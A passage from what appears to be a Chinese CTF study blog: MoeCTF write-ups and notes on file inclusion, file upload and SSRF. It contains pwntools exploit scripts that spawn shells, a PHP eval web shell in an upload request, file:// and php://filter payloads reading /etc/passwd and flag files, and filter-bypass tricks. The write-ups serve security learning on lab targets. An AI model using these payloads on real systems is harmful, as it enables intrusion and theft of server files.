punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LoginSystem"><a href="#LoginSystem" class="headerlink" title="LoginSystem"></a>LoginSystem</h3><p>格式化字符串任意地址写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.56.1'</span><span class="token punctuation">,</span> <span class="token number">55028</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>pass_address <span class="token operator">=</span> <span class="token number">0x404050</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>pass_address<span class="token punctuation">:</span><span class="token number">0x12345678</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'username'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'password'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><p>写<code>shellcode</code>然后跳转过去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.56.1'</span><span class="token punctuation">,</span> <span class="token number">63787</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'99999'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'age'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'say'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-18"><a href="#8-18" class="headerlink" title="#8.18"></a>#8.18</h2><p>搞招新的文案什么的</p><h2 id="8-19"><a href="#8-19" class="headerlink" title="#8.19"></a>#8.19</h2><p>学了点<code>web</code>写了点题，继续逆向看了几个小时还是没有一点头绪</p><h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h3><p>给了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$image_info</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mime_type</span> <span class="token operator">=</span> <span class="token variable">$image_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: '</span> <span class="token operator">.</span> <span class="token variable">$mime_type</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>file伪协议：<code>http://127.0.0.1:64686/index.php?url=file:///etc/passwd</code>得到</p><pre class="line-numbers language-none"><code class="language-none">Warning: Trying to access array offset on false in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 13Warning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:13) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 15root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin www-data:x:1000:1000:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin nginx:x:100:101:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin moectf&#123;I_aM_v3Ry_sOrry-4BouT-tHisa0c9f6f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h3><p>可以执行系统命令，提示查看环境变量，输入<code>env</code>得到环境变量里的<code>flag</code></p><p><code>FLAG=moectf&#123;wElcoME_t0_MOeCtf-AND-Ro4DI-5TArTup-BY-sxRhhh134&#125;</code></p><h3 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h3><p>文件上传一个木马，然后执行<code>env</code>，环境变量里有<code>flag</code></p><p><code>FLAG=moectf&#123;uPloAd-your_P4yI0Ad_And_D0-Wh@t_yoUr_w@ntdb5&#125;</code></p><h3 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h3><p>前端判断后缀是图片，木马改后缀为<code>jpg</code>选择文件，再抓包改<code>php</code>上传文件</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/upload.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:64517</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">213</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="119", "Not?A_Brand";v="24"</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarylCRALsDMbQvs1tSq</span></span><span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:64517</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">cors</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">empty</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:64517/</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>------WebKitFormBoundarylCRALsDMbQvs1tSq<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="image"; filename="test.php"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span>&lt;?php @eval($_POST['pass']);?>------WebKitFormBoundarylCRALsDMbQvs1tSq--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><code>PHP</code>：<code>include</code> &#x2F; <code>require</code> &#x2F; <code>include_once</code> &#x2F; <code>require_once</code></p><p><code>JSP Servlet</code>：<code>ava.io.File()</code> &#x2F; <code>java.io.FileReader()</code> </p><p><code>ASP</code>：<code>includefile</code> &#x2F; <code>includevirtual</code></p><p>当<code>PHP</code>包含一个文件时，会将该文件当做<code>PHP</code>代码执行，而不会在意文件什么类型</p><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p><code>Local File Inclusion，LFI</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'/home/wwwrun/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>%00</code>截断(<code>PHP&lt;5.3.4 &amp; magic_quotes_gpc=off</code>)：<code>?file=../../../../../../../../../etc/passwd%00</code></p><p>路径长度截断：<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code>在<code>Linux</code>中文件名长度<code>&gt;4096</code>，<code>Windows</code>中文件名长度<code>&gt;256</code></p><p>点号截断：<code>?file=../../../../../../../../../boot.ini/………[…]…………</code>，仅适用于<code>Windows</code>，点号长度<code>&gt;256</code></p><p>常见读取路径</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache2&#x2F;*#Apache配置文件，可以获知Web目录、服务端口等信息&#x2F;etc&#x2F;nginx&#x2F;*#Nginx配置文件，可以获知Web目录、服务端口等信息&#x2F;etc&#x2F;crontab#定时任务文件&#x2F;etc&#x2F;environment#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况&#x2F;etc&#x2F;hostname#主机名&#x2F;etc&#x2F;hosts#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP&#x2F;域名&#x2F;etc&#x2F;issue#系统版本信息&#x2F;etc&#x2F;mysql&#x2F;*#MYSQL配置文件&#x2F;etc&#x2F;php&#x2F;*#PHP配置文件&#x2F;proc 目录#&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需&#x2F;proc&#x2F;self代替&#x2F;proc&#x2F;[pid]即可&#x2F;proc&#x2F;[pid]&#x2F;cmdline#cmdline可读出比较敏感的信息ssh &#96;&lt;?php phpinfo(); ?&gt;&#96;@192.168.1.1&#x2F;var&#x2F;log&#x2F;auth.log# apache日志# ssh日志，攻击方法&#x2F;var&#x2F;log&#x2F;apache2&#x2F;[access.log|error.log]# apache日志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Session</code>：<a href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><code>Remote File Inclusion, RFI</code>，前提<code>allow_url_fopen = On</code> 是否允许打开远程文件<code>allow_url_include = On</code> 是否允许<code>include/require</code>远程文件</p><ul><li><p>普通远程文件包含：<code>?file=[http|https|ftp]://example.com/shell.txt</code>需要<code>allow_url_fopen=On &amp; allow_url_include=On</code></p></li><li><p><code>php / data</code>协议</p></li><li><p>限制包含文件的后缀名(<code>&lt;?php **include**($_GET[&#39;filename&#39;] . &quot;.no&quot;); ?&gt;</code>)，用<code>?</code>或<code>#</code>绕过（<code>?filename=http://xxxx/php.txt?</code> &#x2F; <code>?filename=http://xxxx/php.txt%23</code>)</p></li><li><p>利用<code>XSS</code>执行：<code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code>，需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个<code>XSS</code>漏洞，包含这个页面，就可以注入恶意代码了</p></li></ul><h4 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>访问各个输入&#x2F;输出流，常见函数<code>file_get_contents / file_put_contents / readfile / fopen / file / show_source / highlight_file</code></p><ul><li><p><strong><code>php://input</code></strong></p><p>访问<code>POST data</code>数据中的代码，开启<code>enable_post_data_reading</code>时不可用，必须开启<code>allow_url_include</code></p><p>有**<code>file_put_contents</code>**时可以直接写入一句话木马<code>&lt;?php @eval($_POST[cmd]);</code></p></li><li><p><strong><code>php://filter</code></strong></p><p><code>PHP&gt;=5.0.0</code>，用于数据流打开时筛选过滤，题目中出现函数<code>readfile、file、file_get_contents</code>可用，需要<code>allow_url_include=On</code></p><ul><li><p>参数</p><p><code>resource=要过滤的数据流</code></p><p><code>read=读链的筛选列表 、write=写链的筛选列表</code>：可以设定多个<code>|</code>分隔，有<code>file_put_contents</code>时可以用<code>write</code></p><p><code>;两个链的筛选列表</code>：没有<code>read</code>和<code>write</code>时视情况用于读&#x2F;写</p></li><li><p>过滤器：<code>filter</code>不指定过滤器会默认解析<code>PHP</code>代码，非代码需要进行编码</p><p><code>string.rot13</code>：等同于<code>str_rot13()</code>，<code>rot13</code>变换</p><p><code>convert.base64-encode</code></p><p><code>convert.base64-decode</code>：解码按照<code>4</code>位一组，不是<code>4</code>的倍数需要在字符串前补上字母</p><p><code>convert.quoted-printable-encode</code>：<code>quoted-printable</code>字符串与<code>8-bit</code>字符串编码</p><p><code>convert.quoted-printable-decode</code>:<code>quoted-printable</code>字符串与<code>8-bit</code>字符串解码</p></li><li><p>用法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php://filter/resource=flag.php#直接读，PHP代码会被解析php://filter/read=convert.base64-encode/resource=flag.phpphp://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php#base64和rot13被过滤，使用其他编码，ucs-2编码的字符串位数一定要是偶数，ucs-4编码的字符串位数一定要是 4 的倍数，输入的内容也要先进行编码，例如：file_put_contents($file, "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$contents);GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.phpPOST: contents=?&lt;hp pystsme"(ac tlf"*;)#获取编码后的内容<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UCS-2LE"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"UCS-2BE"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php system("cat fl*");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>php<span class="token punctuation">:</span><span class="token comment">//filter/string.rot13/resource=1.php#rot13</span><span class="token comment">#编码可以用于绕过执行代码中多余的die部分，例如file_put_contents(urldecode($file), "&lt;?php die('大佬别秀了');</span><span class="token delimiter important">?></span></span>".$content);php://input#data部分：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>**<code>php://output</code>**：只写的数据流，允许以<code>echo</code>一样的方式写入到输出缓冲区</p></li><li><p>**<code>php://fd</code>**：<code>PHP&gt;=5.3.6</code>允许直接访问指定的文件描述符，如<code>php://fd/3</code></p></li><li><p>**<code>php://memory / php://temp</code>**：<code>PHP&gt;=5.1.0</code> <code>memory</code>将数据存储在内存，<code>temp</code>在内存量达到预定义限制后存入临时文件，可通过<code>/mmaxmemory:xx</code>限制最大数据量</p></li></ul><h4 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>条件：<code>PHP&gt;=5.2.0</code>，用于传递相应格式的数据，通常可以用来执行<code>PHP</code>代码，推荐使用<code>base64</code>编码传参，需要<code>allow_url_include=On</code></p><p>绕过<code>file_get_contents</code>：<code>fn=data://text/plain,bugku</code></p><p><code>base64</code>过简单过滤：<code>fn=data://text/plain;base64,YnVna3U=</code></p><p>执行代码：<code>data://text/plain,&lt;?php phpinfo();</code></p><h4 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>用于访问本地文件系统，存在<code>fopen</code>和<code>file_get_contents</code>函数时可用，如，<code>file:///etc/passwd</code></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>dict://</code> 字典服务器协议，访问字典资源，如，<code>dict:///ip:6739/info：</code></p><p><code>sftp://</code> SSH文件传输协议或安全文件传输协议</p><p><code>ldap://</code> 轻量级目录访问协议</p><p><code>tftp://</code> 简单文件传输协议</p><p><code>gopher://</code> 分布式文档传递服务，可使用<code>gopherus</code>生成<code>payload</code></p><p><code>zip://文件路径/压缩包名称/压缩包中文件名称</code></p><p><code>phar://文件路径/phar文件名称/phar内文件名</code>：也可以访问<code>zip</code>压缩包内容</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>前端检查扩展名：抓包改文件类型为<code>php</code></p><p><code>Content-Type</code> 检测文件类型：抓包改<code>Content-Type</code>符合白名单</p><p>服务器添加后缀：<code>%00</code>截断</p><p>服务器检测扩展名：利用解析漏洞</p><p><code>Apache</code>解析：<code>Apache</code>对后缀解析是从右向左的,<code>phpshell.php.rar.rar.rar.rar</code> 因为<code>Apache</code>不认识<code>.rar</code>会一直遍历后缀到 <code>.php</code></p><p><code>IIS</code>解析：文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code></p><p><code>PHP CGI</code>路径解析：访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将<code>test.jpg</code>当做<code>PHP</code>解析，<code>notexist.php</code>是不存在的文件</p><p>其他方式：后缀大小写、双写（只检测一次<code>php</code>则双写为<code>pphphp</code>，要在<code>php</code>里面双写，不能写连续两个<code>php</code>）、特殊后缀<code>php5</code>，修改包内容大小写过<code>WAF</code></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>服务端请求伪造，服务端提供了<strong>从其他服务器应用获取数据的功能</strong>且没有对目标地址作过滤和限制，可以利用<code>dict / gopher / file</code>协议</p><ul><li><p>阻碍利用</p><p>服务器开启<code>OpenSSL</code>无法进行交互利用</p><p>服务端需要鉴权（<code>Cookies &amp; User：Pass</code>）不能完美利用</p><p>限制请求的端口为<code>http</code>常用的端口，比如，<code>80,443,8080,8090</code></p><p>禁用不需要的协议。仅仅允许<code>http</code>和<code>https</code>请求，防止类似于<code>file:///,gopher://,ftp://</code>等引起的问题</p><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p></li><li><p>常见后端实现：存在<code>fsockopen / file_get_contents / curl_exec</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$content = file_get_contents($_POST['url']);$fp = fsockopen($host, intval($port), $errno, $errstr, 30); <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token 